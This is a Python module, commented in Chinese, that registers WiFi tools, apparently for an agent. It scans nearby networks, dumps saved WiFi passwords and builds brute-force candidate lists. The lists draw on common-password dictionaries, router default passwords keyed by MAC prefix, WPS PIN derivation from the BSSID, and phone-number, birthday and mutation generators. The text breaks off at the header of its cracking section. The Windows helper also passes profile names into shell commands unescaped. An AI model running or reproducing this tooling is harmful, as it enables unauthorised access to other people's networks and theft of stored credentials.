"""WiFi 安全工具 — 网络扫描、配置文件枚举、密码恢复、暴力破解 (Windows/Linux/macOS)"""
import json
import itertools
import os
import random
import re
import subprocess
import sys
import tempfile
import time
from .. import register

# ── 内置字典（500+ 条目）────────────────────────────────
_COMMON_WIFI_PASSWORDS = [
    # ─ 8位纯数字（中国最常见）─
    "12345678", "11111111", "88888888", "00000000", "22222222",
    "55555555", "99999999", "66666666", "33333333", "44444444",
    "77777777", "01234567", "12341234", "11223344", "12121212",
    "12344321", "87654321", "10203040", "10101010", "13131313",
    "14725836", "15935746", "12369874", "11112222", "12332112",
    "13579246", "09876543", "14725836", "15975364", "01234567",
    # ─ 9-10位纯数字 ─
    "123456789", "1234567890", "987654321", "0123456789",
    "111111111", "888888888", "000000000", "999999999",
    "1111111111", "100200300", "123456789a", "a123456789",
    # ─ 中国手机号段（常见号段开头）─
    "13800138000", "13900139000", "15800000000", "18800000000",
    "13500000000", "13600000000", "13700000000", "15900000000",
    "18600000000", "18900000000", "13000000000", "13100000000",
    "13200000000", "15500000000", "15600000000", "16600000000",
    "17600000000", "17700000000", "18500000000", "19900000000",
    "13300000000", "15300000000", "18000000000", "18100000000",
    "17300000000", "15000000000", "15200000000", "15700000000",
    "17000000000", "17100000000", "13400000000", "17800000000",
    "18200000000", "18300000000", "18400000000", "18700000000",
    "19100000000", "19200000000", "19300000000", "19500000000",
    # ─ 键盘模式 ─
    "qwerty", "qwertyuiop", "qwerty123", "qwerty12345",
    "asdfghjkl", "zxcvbnm", "1qaz2wsx", "3edc4rfv", "5tgb6yhn",
    "7ujm8ik,", "9ol.0p;/", "qazwsxedc", "zaqxswcde",
    "qweasdzxc", "qwe123", "qwe12345", "asd123", "asd12345",
    "zxc123", "zxc12345", "1q2w3e4r", "1q2w3e4r5t",
    "qwerty!@#$", "!@#$%^&*", "@#$%^&*(",
    # ─ 英文单词 / 短语 ─
    "password", "password1", "password123", "admin123",
    "admin888", "admin999", "administrator", "iloveyou",
    "sunshine", "princess", "welcome", "welcome1", "changeme",
    "letmein", "letmein12", "monkey123", "dragon123",
    "master123", "hello123", "hello1234", "abc123", "abc12345",
    "abc123456", "abc123.", "abc@123", "abc@12345",
    "a123456", "a1234567", "a12345678", "a1111111",
    "S12345678", "s12345678",
    # ─ 中文拼音常用 ─
    "woaini", "woaini1314", "woaiwojia", "zhang123", "wang123",
    "li12345", "zhao123", "chen123", "yang123", "huang123",
    "wu12345", "liu1234", "xu12345", "sun1234", "ma12345",
    "niuniu", "baobao", "mimamam", "jiayou", "xingfu",
    "aini1314", "1314520", "5201314", "520520", "wanan",
    "zaoan", "haomeng", "nihao", "xiexie", "duibuqi",
    # ─ 常见组合 ─
    "admin@123", "qwerty@123", "wifi@123", "wifi@12345",
    "admin@12345", "root@123", "user@12345",
    "Passw0rd", "Password1", "Qwerty123",
    "admin1234", "admin12345", "admin8888", "admin666",
    "root123", "root1234", "root888", "root8888",
    "test123", "test1234", "test12345", "guest123",
    "user123", "user1234", "user12345",
    # ─ 8位生日格式（常见年份段）─
    "19900101", "19920101", "19950101", "19980101", "20000101",
    "19850101", "19880101", "19910101", "19930101", "19940101",
    "19960101", "19970101", "19990101", "20010101", "20020101",
    "20030101", "20040101", "20050101", "20100101", "20150101",
    "19800101", "19820101", "19860101", "19870101", "19890101",
    "01011990", "01011995", "01012000", "01011988", "01011992",
    "01011980", "01011985", "01011998", "01012001", "01012005",
    # ─ 6位数字（简单密码）─
    "123456", "111111", "888888", "000000", "222222",
    "666666", "999999", "555555", "333333", "444444",
    "777777", "121212", "112233", "123123", "100200",
    # ─ 运营商/厂商默认 ─
    "admin", "Admin", "ADMIN", "root", "Root", "guest", "Guest",
    "Cisco", "cisco123", "netgear", "linksys",
    "huawei", "huawei123", "Huawei123",
    "zte", "zte123", "ZTE123",
    "tenda", "Tenda", "TPLINK", "tplink",
    "xiaomi", "Xiaomi", "xiaomi123",
    "CMCC", "ChinaNet", "chinanet",
    "telnet", "telecom", "telecomadmin",
    "admintelecom", "cuadmin", "unicom",
    # ─ 8位数字更多模式 ─
    "11111111", "12332112", "12369874", "11122233",
    "11223344", "12121212", "12344321", "12345123",
    "11112222", "11221122", "12123434", "12341234",
    "13579246", "24681357", "14725836", "15935746",
    "10002000", "16816888", "88886666", "66886688",
    # ─ 混合 ─
    "adminwx", "wx123456", "wxs123456", "wxadmin",
    "WiFi12345", "WiFi@123", "wlan12345", "WLAN123",
    "net12345", "Net12345", "network", "Network123",
    "123.com", "abc.com", "888.com", "666.com",
    # ─ 路由器默认密码算法常见输出 ─
    "00000000", "11111111", "22222222", "33333333", "44444444",
    "55555555", "66666666", "77777777", "88888888", "99999999",
]

# ── 路由器厂商默认密码表 ──────────────────────────────────
# BSSID 前缀 → 可能的默认密码模式
_ROUTER_DEFAULTS = {
    # Tenda: 部分型号用 MAC 后6位十六进制做密码
    "C8:3A:35": {"brand": "Tenda", "defaults": ["12345678", "00000000", "mac_last6_hex"], "algorithm": "mac_last6"},
    "50:64:2B": {"brand": "Tenda", "defaults": ["12345678", "00000000", "mac_last6_hex"], "algorithm": "mac_last6"},
    "F4:6D:2F": {"brand": "Tenda", "defaults": ["12345678", "00000000", "mac_last6_hex"], "algorithm": "mac_last6"},
    "B0:DF:C1": {"brand": "Tenda", "defaults": ["12345678", "00000000", "mac_last6_hex"], "algorithm": "mac_last6"},
    # TP-LINK
    "A4:A9:30": {"brand": "TP-LINK", "defaults": ["12345678", "admin", "adminadmin"], "algorithm": "none"},
    "F4:C7:14": {"brand": "TP-LINK", "defaults": ["12345678", "admin", "adminadmin"], "algorithm": "none"},
    "50:C7:BF": {"brand": "TP-LINK", "defaults": ["12345678", "admin", "adminadmin"], "algorithm": "none"},
    "14:CC:20": {"brand": "TP-LINK", "defaults": ["12345678", "admin", "adminadmin"], "algorithm": "none"},
    # Xiaomi
    "78:11:DC": {"brand": "Xiaomi", "defaults": ["12345678", "xiaomi", "xiaomi123"], "algorithm": "none"},
    "28:6C:07": {"brand": "Xiaomi", "defaults": ["12345678", "xiaomi", "xiaomi123"], "algorithm": "none"},
    "34:CE:00": {"brand": "Xiaomi", "defaults": ["12345678", "xiaomi", "xiaomi123"], "algorithm": "none"},
    "64:64:4A": {"brand": "Xiaomi", "defaults": ["12345678", "xiaomi", "xiaomi123"], "algorithm": "none"},
    # Huawei
    "48:4D:7E": {"brand": "Huawei", "defaults": ["admin", "huawei", "huawei123", "12345678"], "algorithm": "none"},
    "20:2B:C1": {"brand": "Huawei", "defaults": ["admin", "huawei", "huawei123", "12345678"], "algorithm": "none"},
    "E0:24:7F": {"brand": "Huawei", "defaults": ["admin", "huawei", "huawei123", "12345678"], "algorithm": "none"},
    # ZTE
    "C8:64:C7": {"brand": "ZTE", "defaults": ["zte", "zte123", "12345678", "admin"], "algorithm": "none"},
    "28:ED:E0": {"brand": "ZTE", "defaults": ["zte", "zte123", "12345678", "admin"], "algorithm": "none"},
    # ChinaNet / CMCC 光猫
    "D8:32:E3": {"brand": "ChinaNet (电信)", "defaults": ["12345678", "telecomadmin", "admintelecom"], "algorithm": "none"},
    "50:2B:73": {"brand": "CMCC (移动)", "defaults": ["12345678", "CMCCadmin", "admin"], "algorithm": "none"},
    "00:6B:8E": {"brand": "CU (联通)", "defaults": ["12345678", "cuadmin", "admin", "unicom"], "algorithm": "none"},
    # Netgear
    "2C:B0:5D": {"brand": "Netgear", "defaults": ["password", "12345678", "admin"], "algorithm": "none"},
    "00:24:B2": {"brand": "Netgear", "defaults": ["password", "12345678", "admin"], "algorithm": "none"},
    # D-LINK
    "C8:D3:A3": {"brand": "D-LINK", "defaults": ["admin", "12345678", "password"], "algorithm": "none"},
    "1C:AB:A7": {"brand": "D-LINK", "defaults": ["admin", "12345678", "password"], "algorithm": "none"},
    # ASUS
    "04:D9:F5": {"brand": "ASUS", "defaults": ["admin", "asus123", "12345678"], "algorithm": "none"},
    "38:D5:47": {"brand": "ASUS", "defaults": ["admin", "asus123", "12345678"], "algorithm": "none"},
    # Mercury / Mercury
    "8C:A6:DF": {"brand": "Mercury (水星)", "defaults": ["12345678", "admin", "66666666"], "algorithm": "none"},
    "14:75:90": {"brand": "Mercury (水星)", "defaults": ["12345678", "admin", "66666666"], "algorithm": "none"},
    # FAST (迅捷)
    "E0:D5:CA": {"brand": "FAST (迅捷)", "defaults": ["12345678", "admin", "66666666"], "algorithm": "none"},
}

# ── WPS PIN 计算引擎 ─────────────────────────────────────
# 许多路由器 WPS PIN 由 MAC 地址派生，可精确计算

def _wps_checksum(pin7: int) -> int:
    """计算 WPS PIN 第8位校验和"""
    accum = 0
    pin = pin7
    while pin > 0:
        accum += 3 * (pin % 10)
        pin //= 10
        accum += pin % 10
        pin //= 10
    return (10 - accum % 10) % 10


def _calc_wps_pins_from_mac(bssid: str) -> list[int]:
    """从 MAC 地址推导可能的 WPS PIN

    已知算法:
    - D-Link: PIN = 7位十进制(MAC后3字节) + 校验位
    - TP-Link/Arcadyan: PIN = 十进制(MAC后3字节 XOR 某个值)
    - 部分 Realtek: PIN = 十进制(MAC后4字节)
    - 默认 PIN: 12345670, 00000000, 99999999
    """
    pins = []
    clean = re.sub(r"[^0-9A-Fa-f]", "", bssid.upper())
    if len(clean) < 12:
        return pins

    # 取各段
    b0 = int(clean[0:2], 16)
    b1 = int(clean[2:4], 16)
    b2 = int(clean[4:6], 16)
    b3 = int(clean[6:8], 16)
    b4 = int(clean[8:10], 16)
    b5 = int(clean[10:12], 16)

    # 算法1: D-Link / 通用 — 后3字节直接做十进制
    seq1 = b3 * 65536 + b4 * 256 + b5  # 7位数字
    pins.append(seq1 * 10 + _wps_checksum(seq1))

    # 算法2: 后4字节做十进制（Ralink/Realtek）
    seq2 = b2 * 16777216 + b3 * 65536 + b4 * 256 + b5
    if seq2 < 10000000:
        pins.append(seq2 * 10 + _wps_checksum(seq2))

    # 算法3: XOR 后3字节与固定值 (Arcadyan)
    seq3 = ((b3 * 65536) + (b4 * 256) + b5) ^ 0x555555
    if seq3 < 10000000:
        pins.append(seq3 * 10 + _wps_checksum(seq3))

    # 算法4: 后3字节逆序 (Belkin 等)
    seq4 = b5 * 65536 + b4 * 256 + b3
    pins.append(seq4 * 10 + _wps_checksum(seq4))

    # 算法5: 前3 + 后3 组合 (NIC + 序列号)
    seq5 = b0 * 65536 + b1 * 256 + b2
    if seq5 < 10000000:
        pins.append(seq5 * 10 + _wps_checksum(seq5))

    # 算法6: 后2字节拼前2字节 (Sagemcom)
    seq6 = b4 * 16777216 + b5 * 65536 + b0 * 256 + b1
    if seq6 < 10000000:
        pins.append(seq6 * 10 + _wps_checksum(seq6))

    # 算法7: 后6位十六进制转十进制 (ZTE / Sercomm)
    last6_hex = clean[-6:]
    seq7 = int(last6_hex, 16)
    if seq7 < 10000000:
        pins.append(seq7 * 10 + _wps_checksum(seq7))

    # 常见默认 PIN
    pins.extend([12345670, 00000000, 11111111, 22222222])

    return list(set(pins))  # 去重


# ── 中国特有密码模式扩展 ─────────────────────────────────
_CHINESE_AREA_CODES = [
    "010", "021", "022", "023", "024", "025", "027", "028", "029",
    "020", "0755", "0756", "0769", "0760", "0757", "0754", "0751",
    "0512", "0510", "0511", "0519", "0513", "0514", "0515", "0516",
    "0571", "0574", "0577", "0573", "0572", "0575", "0576", "0578",
    "0591", "0592", "0595", "0596", "0598", "0599",
    "0731", "0730", "0734", "0736", "0738",
    "027", "0710", "0719", "0716", "0718",
    "0371", "0370", "0376", "0377", "0379",
    "0531", "0532", "0533", "0535", "0536", "0537", "0538",
    "0871", "0872", "0874", "0877",
    "0851", "0852", "0853", "0854",
    "0898", "0891", "0892",
    "0991", "0994", "0998",
]

_CHINESE_ZIP_CODES = [
    "100000", "200000", "300000", "400000", "500000",
    "518000", "510000", "310000", "210000", "610000",
    "100010", "100020", "100030", "100050", "100080",
    "200001", "200030", "200050", "200070", "200080",
    "518001", "518010", "518020", "518030", "518040",
]

_CHINESE_PROVINCE = [
    "beijing", "shanghai", "guangzhou", "shenzhen", "hangzhou",
    "nanjing", "chengdu", "wuhan", "chongqing", "tianjin",
    "suzhou", "xiamen", "fuzhou", "changsha", "zhengzhou",
    "jinan", "qingdao", "dalian", "shenyang", "haerbin",
    "kunming", "guiyang", "nanning", "lanzhou", "xian",
    "wulumuqi", "lasa", "xining", "yinchuan",
]

_WPA_XML_TEMPLATE = '''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''


def _run(cmd: list[str], timeout: int = 30) -> str:
    """执行系统命令并返回 stdout"""
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout,
                           shell=True if sys.platform == "win32" else False)
        # Windows netsh 输出可能是 GBK，先试 utf-8 再试 gbk
        raw = r.stdout
        if raw is None:
            return ""
        for enc in ["utf-8", "gbk", "utf-16-le"]:
            try:
                return raw.decode(enc)
            except (UnicodeDecodeError, LookupError):
                continue
        return raw.decode("utf-8", errors="replace")
    except Exception:
        return ""


def _parse_netsh_scan(output: str) -> list[dict]:
    """解析 'netsh wlan show networks mode=bssid' 输出 (中/英文)"""
    networks = {}
    current_ssid = None

    for line in output.split("\n"):
        line = line.strip()

        # SSID 行
        m = re.match(r"^SSID\s+\d+\s*:\s*(.*)$", line)
        if m:
            current_ssid = m.group(1).strip()
            if not current_ssid:
                current_ssid = "(hidden)"
            if current_ssid not in networks:
                networks[current_ssid] = {
                    "ssid": current_ssid, "bssids": [],
                    "security": "Unknown", "signal": "", "encryption": "",
                }
            continue

        # BSSID
        m = re.match(r"^BSSID\s+\d+\s*:\s*(.+)$", line)
        if m and current_ssid:
            networks[current_ssid]["bssids"].append(m.group(1).strip())
            continue

        # Signal: 中文"信号" / 英文"Signal"
        m = re.match(r"^\s*(?:Signal|信号)\s*:\s*(.+)$", line)
        if m and current_ssid:
            networks[current_ssid]["signal"] = m.group(1).strip()
            continue

        # Authentication: 中文"身份验证" / 英文"Authentication"
        m = re.match(r"^\s*(?:Authentication|身份验证)\s*:\s*(.+)$", line)
        if m and current_ssid:
            networks[current_ssid]["security"] = m.group(1).strip()
            continue

        # Encryption: 中文"加密" / 英文"Encryption"
        m = re.match(r"^\s*(?:Encryption|加密)\s*:\s*(.+)$", line)
        if m and current_ssid:
            networks[current_ssid]["encryption"] = m.group(1).strip()
            continue

    return list(networks.values())


def _parse_netsh_profiles(output: str) -> list[str]:
    """解析 'netsh wlan show profiles' 输出"""
    profiles = re.findall(r":\s*(.+)$", output, re.MULTILINE)
    return [p.strip() for p in profiles if p.strip()]


def _get_password_windows(ssid: str) -> str | None:
    """Windows: 获取已保存的 WiFi 密码"""
    output = _run(f'netsh wlan show profile name="{ssid}" key=clear', timeout=15)
    m = re.search(r"(?:Key Content|关键内容)\s*:\s*(.+)$", output, re.MULTILINE)
    if m:
        return m.group(1).strip()
    return None


def _get_password_linux(ssid: str) -> str | None:
    """Linux: 从 NetworkManager 获取 WiFi 密码"""
    # 尝试 nmcli
    output = _run(["nmcli", "-s", "-g", "802-11-wireless-security.psk",
                   "connection", "show", ssid], timeout=10)
    if output.strip():
        return output.strip()
    # 尝试从 /etc/NetworkManager 读取
    try:
        for path in [f"/etc/NetworkManager/system-connections/{ssid}.nmconnection",
                     f"/etc/NetworkManager/system-connections/{ssid}"]:
            with open(path) as f:
                content = f.read()
                m = re.search(r"psk=(.+)", content)
                if m:
                    return m.group(1).strip()
    except Exception:
        pass
    return None


@register(
    "wifi_scan",
    "扫描附近 WiFi 网络。列出 SSID、BSSID、信号强度、信道、加密方式。",
    {}
)
def wifi_scan() -> str:
    platform = sys.platform
    networks = []

    if platform == "win32":
        output = _run("netsh wlan show networks mode=bssid", timeout=30)
        networks = _parse_netsh_scan(output)

    elif platform in ("linux", "darwin"):
        # Linux: nmcli
        output = _run(["nmcli", "-t", "-f",
                       "SSID,BSSID,SIGNAL,SECURITY,CHAN",
                       "dev", "wifi", "list"], timeout=20)
        for line in output.strip().split("\n"):
            if not line.strip():
                continue
            parts = line.split(":")
            if len(parts) >= 4:
                networks.append({
                    "ssid": parts[0] or "(hidden)",
                    "bssids": [parts[1]] if parts[1] else [],
                    "signal": parts[2] if len(parts) > 2 else "",
                    "security": parts[3] if len(parts) > 3 else "Unknown",
                })

        # macOS: airport
        if not networks and platform == "darwin":
            output = _run(["/System/Library/PrivateFrameworks/Apple80211.framework/"
                           "Versions/Current/Resources/airport", "-s"], timeout=15)
            for line in output.strip().split("\n")[1:]:
                parts = line.split()
                if len(parts) >= 3:
                    networks.append({
                        "ssid": parts[0],
                        "bssids": [parts[1]] if len(parts) > 1 else [],
                        "signal": parts[2] if len(parts) > 2 else "",
                        "security": " ".join(parts[3:]) if len(parts) > 3 else "",
                    })

    return json.dumps({
        "platform": platform,
        "networks_found": len(networks),
        "networks": sorted(networks, key=lambda n: n.get("signal", ""), reverse=True)[:50],
    }, ensure_ascii=False)


@register(
    "wifi_profiles",
    "列出本机已保存的 WiFi 配置文件（曾经连接过的网络）。",
    {}
)
def wifi_profiles() -> str:
    profiles = []
    platform = sys.platform

    if platform == "win32":
        output = _run("netsh wlan show profiles", timeout=15)
        names = _parse_netsh_profiles(output)
        for name in names:
            detail = _run(f'netsh wlan show profile name="{name}"', timeout=15)
            # 提取安全类型
            sec = re.search(r"Authentication\s*:\s*(.+)$", detail, re.MULTILINE)
            profiles.append({
                "ssid": name,
                "security": sec.group(1).strip() if sec else "Unknown",
            })

    elif platform == "linux":
        output = _run(["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"], timeout=10)
        for line in output.strip().split("\n"):
            if "wireless" in line.lower() or "wifi" in line.lower():
                parts = line.split(":")
                if parts:
                    profiles.append({"ssid": parts[0], "security": "Unknown"})

    elif platform == "darwin":
        output = _run(["networksetup", "-listpreferredwirelessnetworks",
                       "en0"], timeout=10)
        for line in output.strip().split("\n")[1:]:
            name = line.strip()
            if name:
                profiles.append({"ssid": name, "security": "Unknown"})

    return json.dumps({
        "platform": platform,
        "profiles_count": len(profiles),
        "profiles": profiles,
    }, ensure_ascii=False)


@register(
    "wifi_password",
    "获取本机已保存的 WiFi 密码（仅限已连接过的网络）。用于安全审计和密码恢复。",
    {"ssid": {"type": "string", "description": "WiFi SSID 名称，或 'all' 获取所有已保存密码"}}
)
def wifi_password(ssid: str = "all") -> str:
    platform = sys.platform
    results = []

    # 先获取所有 profile 名称
    profile_names = []
    if platform == "win32":
        output = _run("netsh wlan show profiles", timeout=15)
        profile_names = _parse_netsh_profiles(output)
    elif platform == "linux":
        output = _run(["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"], timeout=10)
        for line in output.strip().split("\n"):
            if "wireless" in line.lower():
                profile_names.append(line.split(":")[0])
    elif platform == "darwin":
        # macOS 需要 sudo，普通用户只能逐个获取
        output = _run(["networksetup", "-listpreferredwirelessnetworks",
                       "en0"], timeout=10)
        profile_names = [l.strip() for l in output.strip().split("\n")[1:] if l.strip()]

    if ssid != "all":
        profile_names = [n for n in profile_names if ssid.lower() in n.lower()]

    for name in profile_names:
        pwd = None
        if platform == "win32":
            pwd = _get_password_windows(name)
        elif platform == "linux":
            pwd = _get_password_linux(name)
        elif platform == "darwin":
            output = _run(["security", "find-generic-password", "-wa", name], timeout=10)
            pwd = output.strip() if output.strip() else None

        if pwd:
            results.append({"ssid": name, "password": pwd})

    return json.dumps({
        "platform": platform,
        "found": len(results),
        "searched": len(profile_names),
        "results": results,
    }, ensure_ascii=False)


# ═══════════════════════════════════════════════════════════
#  动态密码生成引擎
# ═══════════════════════════════════════════════════════════

def _gen_birthdays(count: int = 100) -> list[str]:
    """生成常见生日格式密码 (YYYYMMDD)"""
    results = []
    # 常见年份: 1940-2020
    years = list(range(1980, 2006)) + list(range(1960, 1980)) + list(range(2006, 2021))
    months_days = [
        (1, 1), (1, 2), (1, 8), (1, 18), (1, 28),
        (2, 2), (2, 8), (2, 14), (2, 18), (2, 28),
        (3, 3), (3, 8), (3, 15), (3, 18), (3, 28),
        (4, 4), (4, 8), (4, 18), (4, 28),
        (5, 1), (5, 4), (5, 8), (5, 18), (5, 20), (5, 21), (5, 28),
        (6, 1), (6, 6), (6, 8), (6, 15), (6, 18), (6, 28),
        (7, 1), (7, 7), (7, 8), (7, 18), (7, 28),
        (8, 1), (8, 8), (8, 15), (8, 18), (8, 28),
        (9, 1), (9, 8), (9, 9), (9, 10), (9, 18), (9, 28),
        (10, 1), (10, 8), (10, 10), (10, 18), (10, 28),
        (11, 1), (11, 8), (11, 11), (11, 18), (11, 28),
        (12, 1), (12, 8), (12, 12), (12, 18), (12, 24), (12, 25), (12, 28),
    ]
    for year in years:
        if len(results) >= count:
            break
        for m, d in months_days:
            if len(results) >= count:
                break
            results.append(f"{year:04d}{m:02d}{d:02d}")
    return results


def _gen_phone_numbers(count: int = 100) -> list[str]:
    """生成手机号变体 (11位中国手机号)"""
    results = []
    # 中国三大运营商号段前缀
    prefixes = [
        # 移动
        "138", "139", "137", "136", "135", "134", "150", "151", "152",
        "157", "158", "159", "182", "183", "184", "187", "188", "147",
        "178", "198", "195",
        # 联通
        "130", "131", "132", "155", "156", "185", "186", "166", "176",
        "145", "175", "196",
        # 电信
        "133", "153", "173", "177", "180", "181", "189", "191", "199",
        "149", "193",
    ]
    import random
    rng = random.Random(42)  # 固定种子，保证可复现
    for _ in range(count):
        prefix = rng.choice(prefixes)
        suffix = "".join(str(rng.randint(0, 9)) for _ in range(8))
        results.append(prefix + suffix)
    return results


def _gen_from_ssid(ssid: str) -> list[str]:
    """从 SSID 名称推断可能的密码"""
    results = []
    s = ssid.strip()

    # 提取 SSID 中的数字部分 (如 TP-LINK_819272 → 819272)
    digits = re.findall(r"\d+", s)
    for d in digits:
        if len(d) >= 6:
            results.append(d)
            results.append(d[:8])
            # 补齐到8位
            if len(d) < 8:
                results.append(d + "0" * (8 - len(d)))
                results.append("0" * (8 - len(d)) + d)

    # 提取 SSID 中的字母部分
    letters = re.findall(r"[A-Za-z]+", s)
    for l in letters:
        if len(l) >= 3:
            results.append(l.lower())
            results.append(l.lower() + "123")
            results.append(l.lower() + "@123")
            results.append(l.lower() + "12345")

    # SSID 本身就是常见模式
    ssid_lower = s.lower()
    if "tenda" in ssid_lower:
        results.extend(["12345678", "00000000", "66666666", "88888888"])
    elif "tp-link" in ssid_lower or "tplink" in ssid_lower:
        results.extend(["12345678", "admin", "adminadmin", "tplink123"])
    elif "xiaomi" in ssid_lower:
        results.extend(["12345678", "xiaomi", "xiaomi123", "xiaomi888"])
    elif "chinanet" in ssid_lower:
        results.extend(["12345678", "telecomadmin", "admintelecom", "abcd1234"])
    elif "cmcc" in ssid_lower:
        results.extend(["12345678", "CMCCadmin", "CMCC1234", "cmcc12345"])
    elif "cu_" in ssid_lower or "unicom" in ssid_lower:
        results.extend(["12345678", "cuadmin", "unicom", "admin123"])
    elif "huawei" in ssid_lower:
        results.extend(["huawei", "huawei123", "Huawei123", "admin123"])
    elif "zte" in ssid_lower:
        results.extend(["zte", "zte123", "ZTE123", "12345678"])

    # 常见中文SSID
    if any(kw in ssid_lower for kw in ["商铺", "店", "饭店", "酒店", "宾馆", "餐厅"]):
        results.extend(["88888888", "66666666", "12345678", "00000000"])
    if any(kw in ssid_lower for kw in ["公司", "办公室", "会议"]):
        results.extend(["admin123", "company123", "88888888", "12345678"])

    return list(set(results))  # 去重


def _gen_router_seeds(bssids: list[str]) -> list[str]:
    """根据 BSSID MAC 前缀查询路由器默认密码"""
    results = []
    for bssid in bssids:
        bssid_upper = bssid.upper()
        # 精确匹配 OUI (前8字符)
        prefix8 = bssid_upper[:8] if len(bssid_upper) >= 8 else ""
        prefix5 = bssid_upper[:5] if len(bssid_upper) >= 5 else ""

        for oui, info in _ROUTER_DEFAULTS.items():
            if prefix8.startswith(oui.upper()) or prefix5.startswith(oui.upper()):
                results.append({"bssid": bssid, "brand": info["brand"], "defaults": info["defaults"]})
                if info.get("algorithm") == "mac_last6":
                    # Tenda 算法: MAC 后6位十六进制 或 十进制
                    clean = bssid_upper.replace(":", "")
                    if len(clean) >= 6:
                        last6 = clean[-6:]
                        results[-1]["defaults"].append(last6)
                        try:
                            dec_val = int(last6, 16)
                            results[-1]["defaults"].append(str(dec_val))
                        except ValueError:
                            pass
                break

    return results


# ── 密码变异引擎 ──────────────────────────────────────────
# 将基础密码通过规则变换生成大量变体（leet speak / 大小写 / 后缀等）

_LEET_TABLE = {
    'a': ['4', '@'], 'b': ['8'], 'c': ['(', '{'], 'e': ['3'],
    'g': ['9'], 'h': ['#'], 'i': ['1', '!'], 'l': ['1', '|'],
    'o': ['0'], 's': ['5', '$'], 't': ['7', '+'], 'x': ['><'],
    'z': ['2'], 'A': ['4', '@'], 'E': ['3'], 'I': ['1', '!'],
    'O': ['0'], 'S': ['5', '$'], 'T': ['7'],
}

_COMMON_SUFFIXES = [
    "", "123", "1234", "12345", "123456", "!", "@", "#", "$",
    "123!", "@123", "!@#", "123!@#", "2018", "2019", "2020",
    "2021", "2022", "2023", "2024", "2025", "2026",
    "1", "12", "88", "99", "00", "11", "22", "33",
    "..", "...", "!!!", "!!!", "~~~", "***",
    ".com", ".cn", "@com", "@cn",
]


def _mutate_password(base: str, rules: str = "all") -> list[str]:
    """对基础密码应用变异规则生成变体列表

    rules: all, leet, case, suffix, repeat, reverse, combo
    """
    results = {base}
    n = len(base)

    def add(p):
        p = str(p).strip()
        if 6 <= len(p) <= 32:
            results.add(p)

    # 大小写变换
    if rules in ("case", "all"):
        if any(c.isalpha() for c in base):
            add(base.lower())
            add(base.upper())
            add(base.capitalize())
            # 大小写交换
            add(base.swapcase())
            # 仅首字母大写其余不变
            if n > 1:
                add(base[0].upper() + base[1:])
            # 每个词首字母大写
            add(base.title())

    # 数字变换
    if rules in ("repeat", "all"):
        add(base + base[:min(4, n)])           # password → passwordpass
        add(base[:min(4, n)] + base)           # passpassword
        add(base * 2)                           # 双倍 (限于<16字符)

    # 反转
    if rules in ("reverse", "all"):
        add(base[::-1])

    # Leet speak (对每个字母做替换)
    if rules in ("leet", "all"):
        leet_variants = set()
        leet_variants.add(base)
        for pos, char in enumerate(base):
            if char in _LEET_TABLE:
                new_variants = set()
                for repl in _LEET_TABLE[char]:
                    for v in leet_variants:
                        new_variants.add(v[:pos] + repl + v[pos + 1:])
                leet_variants.update(new_variants)
        # 限制leet变体数量
        for v in list(leet_variants)[:20]:
            add(v)

    # 常见后缀
    if rules in ("suffix", "combo", "all"):
        for sfx in _COMMON_SUFFIXES:
            add(base + sfx)

    # 组合: suffix + leet + case 的所有两两组合
    if rules in ("combo", "all"):
        combo_base = set(results)
        for b in combo_base:
            # 后缀叠加
            for sfx in ["123", "12345", "@123", "!", "2024", "888"]:
                add(b + sfx)
            # leet叠加
            if any(c in _LEET_TABLE for c in b):
                lv = b
                for pos, char in enumerate(b):
                    if char in _LEET_TABLE:
                        lv = lv[:pos] + _LEET_TABLE[char][0] + lv[pos + 1:]
                add(lv)

    return list(results)


def _gen_mutated_list(seed_passwords: list[str], count: int) -> list[str]:
    """对种子密码列表进行批量变异，产生大量候选"""
    results = []
    seen = set()
    rng = random.Random(42)
    for seed in seed_passwords:
        if len(results) >= count:
            break
        mutations = _mutate_password(seed, rules="all")
        # 交错排列: 种子+变异交替，保持多样性
        rng.shuffle(mutations)
        for m in mutations:
            if m not in seen:
                seen.add(m)
                results.append(m)
                if len(results) >= count:
                    break
    return results


def _build_password_list(ssid: str, bssids: list[str], wordlist: str,
                         max_attempts: int) -> list[str]:
    """根据 SSID/BSSID 上下文智能构建密码列表"""
    passwords = []
    seen = set()

    def add(pwds):
        for p in pwds:
            p = str(p).strip()
            if p and p not in seen and len(p) >= 6:
                seen.add(p)
                passwords.append(p)

    if wordlist in ("common", "all", "smart"):
        add(_gen_from_ssid(ssid))
        for seed in _gen_router_seeds(bssids):
            add(seed["defaults"])
        add(_COMMON_WIFI_PASSWORDS)
        # 中国特有模式
        add(_CHINESE_AREA_CODES)
        add(_CHINESE_ZIP_CODES)
        for prov in _CHINESE_PROVINCE:
            add([prov, prov + "123", prov + "12345", prov + "123456",
                 prov + "888", prov + "666", prov + "@123", prov + "2018",
                 prov + "2019", prov + "2020", prov + "2021", prov + "2022"])

    if wordlist in ("phone", "all"):
        add(_gen_phone_numbers(300))

    if wordlist in ("birthday", "all"):
        add(_gen_birthdays(300))

    if wordlist in ("digits8",):
        priority = [str(i) * 4 for i in range(10)]
        priority += [str(i) * 3 + str(i + 1) * 3 for i in range(10) if i < 9]
        priority += ["".join(str((j + i) % 10) for j in range(8)) for i in range(10)]
        add(priority)
        for i in range(10000000, 10000000 + 3000):
            passwords.append(str(i))
        add(_gen_birthdays(500))

    if wordlist in ("mutate", "all"):
        # 对基础密码做变异扩展（leet/case/suffix/reverse等）
        base_pwds = list(seen)[:100]  # 前100个基础密码
        mutated = _gen_mutated_list(base_pwds, max_attempts // 2)
        add(mutated)

    if wordlist == "all":
        add(_gen_birthdays(800))
        add(_gen_phone_numbers(800))
        for i in range(0, 3000):
            passwords.append(str(i).zfill(8))
        add([str(i) * 4 for i in range(10)])

    return passwords[:max_attempts]


# ═══════════════════════════════════════════════════════════
#  WiFi 密码破解工具
